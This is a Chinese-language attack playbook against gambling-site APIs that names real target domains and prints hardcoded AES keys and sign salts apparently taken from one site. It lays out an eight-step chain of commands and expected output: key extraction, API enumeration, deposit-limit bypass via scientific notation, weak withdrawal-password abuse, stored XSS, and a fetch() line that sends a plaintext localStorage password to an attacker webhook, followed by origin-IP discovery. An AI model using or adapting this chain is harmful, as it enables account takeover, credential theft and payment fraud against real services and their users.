# 博彩站 API 协议破解链 Playbook

> 大爱仙尊作业卡。  
> 适用：任何使用 `/api.html?method=xxx`、`/api.php?action=xxx` 等单点 dispatcher 的博彩站  
> 已验证目标：wlzonghe.nimingkj.com、wldzylbot (MQTT/XXTEA)  

---

## 核心洞察

博彩站 **几乎 100%** 存在以下设计缺陷，按利用价值排序：

| # | 缺陷 | wlyx888 实证 | 利用工具 |
|---|------|-------------|---------|
| 1 | AES key + MD5 sign salt 硬编码在前端 JS | `4523E51C8F78D3ED` + `FA72ACE1...` | `js_secret_hunter.py` |
| 2 | `/api.html` 匿名接口泄露支付配置 | `playlist` 返回 `dlpay_usdt`/`okpay_*` | `api_dispatcher_enum.py` |
| 3 | 充值金额无后端校验，科学计数法 `1e3` 绕过上限 | `playmaxamount:10` 但 `1e3`/`1000` 均创单 | `logic_vuln_probe.py` |
| 4 | 提现密码接受 1 位弱口令（`1`/`a`） | `upwithpass` + `postwithdrawal` 验证通过 | `logic_vuln_probe.py` |
| 5 | `localStorage` 明文保存账号密码 | `h5_login_password` 明文 | `stored_xss_probe.py` + `js_secret_hunter.py` |
| 6 | `getcopyright.data.txt` → `innerHTML`（存储型 XSS） | 版权字段无净化 | `stored_xss_probe.py` |
| 7 | 多镜像共享 session，token 跨域有效 | 镜像 A token 在镜像 B 可用 | `test_subdomain_enum.py` |
| 8 | 注册接口用户名枚举 | `web_reg` 返回"用户名已注册" | `api_dispatcher_enum.py` |

## 完整攻击链（从零到 Admin）

### Step 1：JS 密钥提取（5 分钟）

```bash
# 自动从站点 JS bundle 提取 AES key + sign salt + TG Bot Token
python3 炼蛊房/js_secret_hunter.py hunt \
  --base https://target.com --case CASE

# 预期输出：
# ★★★ 疑似 AES KEY: '4523E51C8F78D3ED'
# ★★★ 疑似 Sign Salt: 'FA72ACE15FEB1FB2111E9AE1938550DABCCA4E52'
# ★ localStorage 密码字段: ['h5_login_password', 'h5_login_username']
```

**为什么总能找到：** 博彩站前端 JS 需要客户端加密请求，key 必须在 JS 里，不可能不在。

### Step 2：验证密钥有效性

```bash
python3 炼蛊房/js_secret_hunter.py verify \
  --base https://api.target.com/api.html \
  --key 4523E51C8F78D3ED \
  --salt FA72ACE15FEB1FB2111E9AE1938550DABCCA4E52 \
  --case CASE
# ★★★ playlist/gametype/gamelist 验证成功！AES key + salt 可用
```

### Step 3：API 方法枚举（发现匿名接口）

```bash
python3 炼蛊房/api_dispatcher_enum.py scan \
  --base https://api.target.com/api.html \
  --key 4523E51C8F78D3ED \
  --salt FA72ACE15FEB1FB2111E9AE1938550DABCCA4E52 \
  --case CASE

# ★ [ACCESSIBLE] playlist         → 支付通道配置（dlpay_usdt / okpay_* / tencent_appid）
# ★ [ACCESSIBLE] getcopyright     → innerHTML XSS 入口
# ★ [ACCESSIBLE] carousel         → 活动富文本
# + [AUTH_REQ]   depositslist     → 需要 token（先注册账号）
```

### Step 4：匿名接口深挖

```bash
# playlist 通常包含所有支付通道配置
python3 炼蛊房/api_dispatcher_enum.py replay \
  --base https://api.target.com/api.html \
  --method playlist --key KEY --salt SALT --case CASE

# 关注字段：
# dlpay_usdt, dlpay_cny, wlpay_usdt, okpay_*
# playmaxamount（充值上限），playminamount（充值下限）
# webreglogin（是否开放注册）
# tencent_appid, appkey
```

### Step 5：注册账号 + 枚举已认证接口

```bash
# 注册测试账号（注意：web_reg 返回"用户名已注册"可枚举用户名）
python3 炼蛊房/api_dispatcher_enum.py replay \
  --base https://api.target.com/api.html \
  --method web_reg \
  --extra "username=test8888888 password=Test@12345 mobile=13800138000" \
  --key KEY --salt SALT --case CASE

# 用新账号 token 扫描所有已认证接口
python3 炼蛊房/api_dispatcher_enum.py scan \
  --base https://api.target.com/api.html \
  --key KEY --salt SALT --token <USER_TOKEN> --case CASE
```

### Step 6：业务逻辑漏洞挖掘

```bash
python3 炼蛊房/logic_vuln_probe.py scan \
  --base https://target.com --token <TOKEN> --case CASE

# 测试项：
# Test 1: 负数充值金额（-100）
# Test 2: 科学计数法绕过金额上限（1e3 绕过 playmaxamount:10）★wlyx888 实证
# Test 3: 提现订单重放
# Test 4: 优惠码并发领取
# Test 5: 弱提现密码（1/a）★wlyx888 实证
```

### Step 7：存储型 XSS → Admin Cookie

```bash
# getcopyright.data.txt → innerHTML 是直接 XSS 入口
# 如果能拿到内容编辑权限（低权账号 / 代理商），直接注入 script
python3 炼蛊房/stored_xss_probe.py scan \
  --base https://target.com --token <TOKEN> \
  --webhook https://YOUR_INTERACTSH_HOST --case CASE

# XSS 执行后 localStorage 里的明文密码可直接窃取：
# fetch('https://your.hook/xss?pw=' + localStorage.getItem('h5_login_password'))
```

### Step 8：多镜像穿透

```bash
# 枚举测试子域（往往不保护 CF）
python3 炼蛊房/test_subdomain_enum.py scan \
  --domain target.com --case CASE

# 在镜像 A 登录的 token 通常在镜像 B 也能用（共享后端）
# 用 origin_recon 找到镜像真实 IP → 直打后台
python3 炼蛊房/origin_recon.py --domain target.com --case CASE
```

## 签名算法参考（常见博彩站变体）

### 变体 A（wlyx888 模式）
```
sign = MD5_UPPER("method={method}&salt={salt}&timestamp={ts}")
```

### 变体 B（含 token）
```
sign = MD5_UPPER("method={method}&salt={salt}&timestamp={ts}&token={token}")
```

### 变体 C（AES 加密 body）
```
body = AES_ECB_PKCS7(JSON.stringify({method, params, timestamp}), key)
POST /api.html
body=encodeURIComponent(aes_encrypted)&sign=MD5(body+salt)
```

### 变体 D（wldzylbot XXTEA 模式）
```
key = "prod"（硬编码在 WASM 里）
body = XXTEA_encrypt(JSON.stringify({method, data}), key)
```

## 关键情报字段（匿名 API 泄露清单）

从 `playlist` / `getcopyright` / `carousel` 提取：

| 字段 | 含义 | 利用方向 |
|------|------|---------|
| `dlpay_usdt` / `okpay_*` | 支付通道标识 | 假支付 callback |
| `playmaxamount` / `playminamount` | 充值金额限制 | 科学计数法绕过 |
| `tencent_appid` / `appkey` | 腾讯 SDK key | 依赖分析 |
| `link1~link5` (TG) | 运营 TG 链接 | TG bot 枚举 |
| `img1~img5` (OSS) | 对象存储路径 | 猜测桶名 |
| `txt` (HTML) | innerHTML 内容 | XSS 入口 |
| `webreglogin` | 是否开放注册 | 决定能否注册账号 |
| `AnonyPayBot` / `YYpayalipay` | TG 支付 Bot | tg_cmd_enum 打 Bot |

## 工具链速查

```bash
# 0. 入口：从 JS 提取密钥
python3 炼蛊房/js_secret_hunter.py hunt --base URL --case CASE

# 1. 枚举 API 方法（匿名 + 认证）
python3 炼蛊房/api_dispatcher_enum.py scan --base URL/api.html --key K --salt S --case CASE

# 2. 深挖匿名接口
python3 炼蛊房/api_dispatcher_enum.py replay --base URL/api.html --method playlist --key K --salt S

# 3. 逻辑漏洞（科学计数法 + 弱提现密码 + 并发超提）
python3 炼蛊房/logic_vuln_probe.py scan --base URL --token T --case CASE

# 4. XSS（getcopyright → innerHTML 直通路）
python3 炼蛊房/stored_xss_probe.py scan --base URL --token T --webhook HOOK --case CASE

# 5. TG Bot 管理员指令
python3 炼蛊房/tg_cmd_enum.py find-bots --site-domain target.com --case CASE

# 6. 子域 / 多镜像
python3 炼蛊房/test_subdomain_enum.py scan --domain target.com --case CASE
```
